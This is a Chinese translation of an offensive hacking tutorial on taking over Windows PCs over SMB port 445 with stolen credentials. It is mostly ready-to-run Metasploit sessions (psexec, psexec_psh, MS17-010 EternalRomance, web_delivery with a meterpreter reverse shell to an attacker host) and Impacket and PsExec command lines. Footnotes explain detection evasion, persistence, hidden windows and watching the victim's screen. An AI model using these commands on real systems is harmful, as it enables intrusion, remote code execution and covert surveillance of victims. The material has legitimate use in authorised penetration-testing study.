## 使用SMB端口连接远程PC的多种方法 [^1]

**通过Metasploit内置漏洞利用SMB开发Windows Server 2008 R2：**

- Microsoft Windows身份验证用户代码执行 [^2]

  - ```bash
    msf > use exploit/windows/smb/psexec
    msf exploit windows/smb/psexec) > set rhost 192.168.1.104
    msf exploit(windows/smb/psexec) > set smbuser administrator
    msf exploit(windows/smb/psexec) > set smbpass Ignite@123
    msf exploit(windows/smb/psexec) > exploit
    ```

- Microsoft Windows身份验证的Powershell命令执行 [^3]

  - ```bash
    msf > use exploit/windows/smb/psexec_psh
    msf exploit(windows/smb/psexec_psh) > set rhost 192.168.1.104
    msf exploit(windows/smb/psexec_psh) > set smbuser administrator
    msf exploit(windows/smb/psexec_psh) > set smbpass Ignite@123
    msf exploit(windows/smb/psexec_psh) > exploit
    ```

- Microsoft Windows身份验证管理实用程序 [^4]

  - ```bash
    use exploit/multi/script/web_delivery
    msf exploit(multi/script/web_delivery) > set target 3
    msf exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_tcp
    msf exploit(multi/script/web_delivery) > set lhost 192.168.1.106
    msf exploit(multi/script/web_delivery) > exploit
    ```

  - ```bash
    msf > use auxiliary/admin/smb/psexec_command
    msf auxiliary(admin/smb/psexec_command) > set rhosts 192.168.1.104
    msf auxiliary(admin/smb/psexec_command) > set smbuser administrator
    msf auxiliary(admin/smb/psexec_command) > set smbpass Ignite@123
    msf auxiliary(admin/smb/psexec_command) > set COMMAND [Paste above copied dll code here]
    msf auxiliary(admin/smb/psexec_command) > exploit
    ```

- SMB Impacket WMI Exec

  - ```bash
    msf > use auxiliary/scanner/smb/impacket/wmiexec
    msf auxiliary(scanner/smb/impacket/wmiexec) > set rhosts 192.168.1.104
    msf auxiliary(scanner/smb/impacket/wmiexec) > set smbuser administrator
    msf auxiliary(scanner/smb/impacket/wmiexec) > set smbpass Ignite@123
    msf auxiliary(scanner/smb/impacket/wmiexec) > set COMMAND systeminfo
    msf auxiliary(scanner/smb/impacket/wmiexec) > exploit
    ```

**第三方工具**

- Impacket（**Psexec.py**） [^5]

  - ```bash
    git clone https://github.com/CoreSecurity/impacket.git
    cd impacket/
    python setup.py install
    cd examples
    # Syntax: ./psexec.py [[domain/] username [: password] @] [Target IP Address]
    ./psexec.py SERVER/Administrator:Ignite@192.168.1.104
    ```

- Impacket（**Atexec.py**） [^6]

  - ```bash
    # Syntax: /atexec.py [[domain/] username [: password] @] [Target IP Address] [Command]
    ./atexec.py SERVER/Administrator:Ignite123@192.168.1.104 systeminfo
    ```

- Psexec.exe [^7]

  - ```bash
    PsExec.exe\\192.168.1.104 -u administrator -p Ignite@123 cmd
    ```

- Atelier Web Remote Commander [^8]

**通过Metasploit内置漏洞利用SMB开发Windows 2007：**

- MS17-010 EternalRomance SMB远程代码执行 [^9]

  - ```bash
    msf > use exploit/windows/smb/ms17_010_psexec
    msf exploit(windows/smb/ms17_010_psexec) > set rhost 192.168.1.105
    msf exploit(windows/smb/ms17_010_psexec) > set smbuser raj
    msf exploit(windows/smb/ms17_010_psexec) > set smbpass 123
    msf exploit(windows/smb/ms17_010_psexec) > exploit
    ```

- MS17-010 EternalRomance SMB远程命令执行 [^10]

  - ```
    use exploit/multi/script/web_delivery
    msf exploit(multi/script/web_delivery) > set target 3
    msf exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_tcp
    msf exploit(multi/script/web_delivery) > set lhost 192.168.1.106
    msf exploit(multi/script/web_delivery) > exploit
    ```

  - ```bash
    msf > use auxiliary/admin/smb/ms17_010_command
    msf auxiliary(admin/smb/ms17_010_command) > set rhosts 192.168.1.105
    msf auxiliary(admin/smb/ms17_010_command) > set smbuser raj
    msf auxiliary(admin/smb/ms17_010_command) > set smbpass 123
    msf auxiliary(admin/smb/ms17_010_command) > set COMMAND [Paste above copied dll code here]
    msf auxiliary(admin/smb/ms17_010_command) > exploit
    ```

[原文](https://www.hackingarticles.in/multiple-ways-to-connect-remote-pc-using-smb-port/)

---

[^1]: 一旦您收集了受害者PC的用户名和密码，我们将学习如何通过SMB端口445连接受害者的机器。
[^2]: 此模块使用有效的管理员用户名和密码（或密码哈希）来执行任意有效负载。此模块类似于SysInternals提供的“psexec”实用程序。该模块现在可以自行清理。此工具创建的服务使用随机选择的名称和描述
[^3]: 此模块使用有效的管理员用户名和密码，使用与SysInternals提供的“psexec”实用程序类似的技术执行PowerShell有效内容。有效负载在base64中编码，并使用-encoded命令标志从命令行执行。使用此方法，有效负载永远不会写入磁盘，并且假设每个有效负载都是唯一的，则不太容易进行基于签名的检测。提供持久选项以在while循环中执行有效负载以便维持一种持久性形式。在沙盒观察PSH执行的情况下，可以添加延迟和其他混淆以避免检测。为了避免当前用户的交互式进程通知，psh有效负载的大小已经减小并包含在PowerShell调用中，该调用完全隐藏了窗口
[^4]: 此模块使用有效的管理员用户名和密码，使用与SysInternals提供的“psexec”实用程序类似的技术**在一个或多个主机上执行任意命令**。使用'＆'的菊花链命令不起作用，用户不应该尝试。此模块很有用，因为它不需要将任何二进制文件上载到目标计算机。因此，在新的Metasploit框架中，我们使用Web传输模块来获取恶意dll代码，我们可以将其用作主机上的任意命令
[^5]: Psexec.py允许您在远程Windows系统上执行进程，在远程系统上复制文件，处理其输出并将其流回。它允许直接使用完整的交互式控制台执行远程shell命令，而无需安装任何客户端软件。
[^6]: 此示例通过Task Scheduler服务在目标计算机上执行命令，并返回已执行命令的输出。
[^7]: Psexec.exe是帮助我们访问网络中其他计算机的软件。该软件直接将我们带到远程PC的外壳，其优点是无需手动操作。从 - > **[下载地址](http://download.sysinternals.com/files/PSTools.zip)**下载此软件
[^8]: 这是一个图形软件，让我们可以很容易地控制受害者的PC。打开软件后，在远程主机框中提供受害者PC 的  **IP地址** 以及各自框中的  **用户名**  和  **密码** 。然后点击  **connect** ; 整个受害者的PC屏幕将显示在您的桌面上，您可以很好地了解受害者的行为。
[^9]: 该模块将利用具有MS17-010漏洞的SMB来实现write-what-where原语。然后，这将用于以管理员会话覆盖连接会话信息。从那里，完成正常的psexec有效载荷代码执行。在EternalRomance，EternalChampion和EternalSynergy漏洞中看到，在Transaction和Write请求之间以及Transaction事务请求中的竞争条件中利用了一种混淆。此漏洞链比EternalBlue漏洞利用更可靠，但需要命名管道
[^10]: 该模块将利用具有MS17-010漏洞的SMB来实现write-what-where原语。然后，这将用于以管理员会话覆盖连接会话信息。从那里，正常的psexec命令执行完成。在EternalRomance，EternalChampion和EternalSynergy漏洞中看到，在Transaction和Write请求之间以及Transaction事务请求中的竞争条件中利用了一种混淆。此漏洞链比EternalBlue漏洞利用更可靠，但需要命名管道。因此，在新的Metasploit框架中，我们使用Web传输模块来获取恶意dll代码，我们可以将其用作主机上的任意命令